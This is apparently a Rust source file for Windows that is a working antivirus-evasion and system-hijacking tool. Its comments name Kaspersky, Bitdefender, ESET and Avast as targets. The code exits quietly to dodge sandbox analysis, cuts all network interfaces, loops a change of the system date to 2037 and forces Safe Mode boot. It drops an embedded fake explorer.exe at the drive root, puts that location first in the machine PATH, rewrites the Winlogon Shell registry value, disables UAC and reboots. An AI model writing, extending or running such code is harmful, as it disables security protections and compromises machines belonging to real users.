use std::process::{Command, Stdio, exit};
use std::path::{Path};
use std::fs::{File};
use std::io::{self, Write};
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE, KEY_WRITE};
use winreg::RegKey;
use std::fs;
use std::env;
use std::thread;

fn disable_uac() -> io::Result<()> {
    // Open the registry key for User Account Control
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);

    let uac_key = match hkcu.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
        KEY_SET_VALUE
    ) {
        Ok(key) => key,
        Err(e) => {
            eprintln!("Failed to open UAC registry key: {}", e);
            return Err(e);
        }
    };

    // Set EnableLUA to 0 to disable UAC
    match uac_key.set_value("EnableLUA", &0u32) {
        Ok(_) => {
            println!("UAC has been disabled (EnableLUA set to 0).");
            Ok(())
        }
        Err(e) => {
            eprintln!("Failed to modify UAC registry value: {}", e);
            Err(e)
        }
    }
}

fn enable_safe_mode() -> io::Result<()> {
    // Set the system to boot in Safe Mode
    let status = Command::new("bcdedit.exe")
        .arg("/set")
        .arg("{current}")
        .arg("safeboot")
        .arg("minimal")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output();

    match status {
        Ok(_) => {
            println!("System set to boot in Safe Mode.");
            Ok(())
        }
        Err(e) => {
            eprintln!("Failed to enable Safe Mode: {}", e);
            Err(e)
        }
    }
}

fn disable_network_interfaces() -> Result<(), std::io::Error> {
    // Retrieve the list of network interfaces
    let output = Command::new("netsh")
        .arg("interface")
        .arg("show")
        .arg("interface")
        .output();

    let output = match output {
        Ok(o) => o,
        Err(e) => {
            eprintln!("Failed to retrieve network interfaces: {}", e);
            return Err(e);
        }
    };

    let interfaces = String::from_utf8_lossy(&output.stdout);

    // Loop through interfaces and disable them
    for line in interfaces.lines() {
        if line.contains("Enabled") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(interface_name) = parts.get(3) {
                println!("Disabling interface: {}", interface_name);

                let disable_status = Command::new("netsh")
                    .arg("interface")
                    .arg("set")
                    .arg("interface")
                    .arg(interface_name)
                    .arg("disable")
                    .output();

                if let Err(e) = disable_status {
                    eprintln!("Failed to disable interface {}: {}", interface_name, e);
                }
            }
        }
    }

    Ok(())
}

fn change_system_date() -> Result<(), String> {
    // Change system date to 12-12-2037 (Windows format mm-dd-yyyy)
    let date_command = "date 12-12-2037";

    // Run the date command using cmd
    let date_output = Command::new("cmd")
        .arg("/C")
        .arg(date_command)
        .stderr(Stdio::inherit())  // Direct error output to the console
        .output();

    match date_output {
        Ok(output) => {
            if output.status.success() {
                println!("System date changed to 12-12-2037.");
                Ok(())
            } else {
                Err(format!(
                    "Failed to change date: {}",
                    String::from_utf8_lossy(&output.stderr)
                ))
            }
        }
        Err(e) => Err(format!("Failed to execute date command: {}", e)),
    }
}

fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn extract_explorer_exe() -> io::Result<()> {
    // Retrieve the system drive (typically C:)
    let system_drive = env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string());

    // Create a long-lived value for the target path
    let target_path_str = format!("{}\\explorer.exe", system_drive);
    let target_path = Path::new(&target_path_str);

    // Create (or overwrite) the file at the target path
    let mut file = match File::create(&target_path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to create file {}: {}", target_path.display(), e);
            return Err(e);
        }
    };

    // Write the embedded executable data to the file
    match file.write_all(include_bytes!("../resources/explorer.exe")) {
        Ok(_) => {
            println!("Explorer executable saved to {}.", target_path.display());
            Ok(())
        }
        Err(e) => {
            eprintln!("Failed to write executable data to {}: {}", target_path.display(), e);
            Err(e)
        }
    }
}

fn reboot_system() -> io::Result<()> {
    // Shutdown and reboot the system
    let status = Command::new("shutdown.exe")
        .arg("-r")
        .arg("-t")
        .arg("2")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output();

    match status {
        Ok(_) => {
            println!("System reboot command executed successfully.");
            Ok(())
        }
        Err(e) => {
            eprintln!("Failed to execute system reboot: {}", e);
            Err(e)
        }
    }
}

fn create_directory() -> io::Result<()> {
    // Retrieve the Program Files directory dynamically
    let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());

    // Create a long-lived value for the directory path
    let dir_path_str = format!("{}/utkudrk2", program_files);
    let dir_path = Path::new(&dir_path_str);

    // Step 2: Ensure the directory exists
    match fs::create_dir_all(dir_path) {
        Ok(_) => {
            println!("Directory successfully created at: {}", dir_path.display());
            Ok(())
        }
        Err(e) => {
            eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
            exit(0); // Exit the program with an success code to bypass malware analysis
        }
    }
}

fn set_system_path_first() -> io::Result<()> {
    // Retrieve the current PATH (this may be the user or process PATH)
    let mut current_path = env::var("PATH").unwrap_or_default();

    // Trim any leading/trailing spaces and quotes from the whole string
    current_path = current_path.trim().trim_matches('"').to_string();

    let parts: Vec<&str> = current_path.split(';').collect();

    // Define the expected system drive reference
    let system_drive_var = "%SystemDrive%\\";

    // Check if the first non-empty element is already "%SystemDrive%\"
    if let Some(first) = parts.iter().find(|s| !s.trim().is_empty()) {
        if first.trim().eq_ignore_ascii_case(system_drive_var) {
            println!("[+] System PATH already starts with {}", system_drive_var);
            return Ok(());
        }
    }

    // Prepend "%SystemDrive%\" to the current PATH
    let new_path = format!("{};{}", system_drive_var, current_path);

    // Remove all quotes from the new_path string
    let sanitized_path = new_path.replace('"', "");

    // Call setx directly to update the machine PATH (setx has a limit of ~1024 characters)
    let output = Command::new("setx")
        .args(&["/M", "PATH", &sanitized_path])
        .output();

    if let Ok(output) = output {
        if output.status.success() {
            println!("[+] PATH successfully updated.");
        } else {
            eprintln!("Error updating system PATH: {:?}", output);
        }
    } else {
        eprintln!("Failed to execute setx command.");
    }

    Ok(())
}

fn modify_registry() -> io::Result<()> {
    // Open the registry key for Winlogon with write access
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);

    let winlogon_key = match hkcu.create_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        KEY_WRITE,
    ) {
        Ok((key, _)) => key,
        Err(e) => {
            eprintln!("Failed to open or create registry key: {}", e);
            return Err(e);
        }
    };

    // Set the new "Shell" value
    let new_shell_value = r"cmd.exe /c explorer.exe";
    if let Err(e) = winlogon_key.set_value("Shell", &new_shell_value) {
        eprintln!("Failed to modify registry value: {}", e);
        return Err(e);
    }

    println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);
    Ok(())
}

fn main() {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        exit(0); // Exit the program with a success status
    }

    println!("Admin privileges confirmed.");

    // Calling the create_directory function and checking for errors
    if let Err(e) = create_directory() {
        // Handle the error if the directory creation fails
        eprintln!("Error creating directory: {}", e);
    } else {
        // Directory creation was successful
        println!("Directory was created without any issues.");
    }

    // Step 3: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
    // Cut network first to avoid auto update, cloud analysis, license check
    if let Err(e) = disable_network_interfaces() {
        eprintln!("Error disabling network interfaces: {}", e);
    }

    // Spawn a new thread that repeatedly attempts to change the system date.
    thread::spawn(|| {
        loop {
            if let Err(e) = change_system_date() {
                eprintln!("Error changing system date: {}", e);
            }
        }
    });

    // Step 4: Enable safe mode
    if let Err(e) = enable_safe_mode() {
        eprintln!("Error enabling safe mode: {}", e);
    }
        
    // Step 5: Extract safe boot payload
    if let Err(e) = extract_explorer_exe() {
        eprintln!("Error extracting embedded safe boot executable: {}", e);
    }
    
    // Step 6: Use set system path first to redirect to fake explorer.exe
    if let Err(e) = set_system_path_first() {
        eprintln!("Error setting system path: {}", e);
        return;
    }

    // Step 7: Reboot the system to Safe Mode
    if let Err(e) = reboot_system() {
        eprintln!("Error rebooting system: {}", e);
    }

    // Step 8: Modify Registry
    if let Err(e) = modify_registry() {
        eprintln!("Error modifying registry: {}", e);
    }

    // Step 9: Disable UAC
    if let Err(e) = disable_uac() {
        eprintln!("Error disabling UAC: {}", e);
    }

}
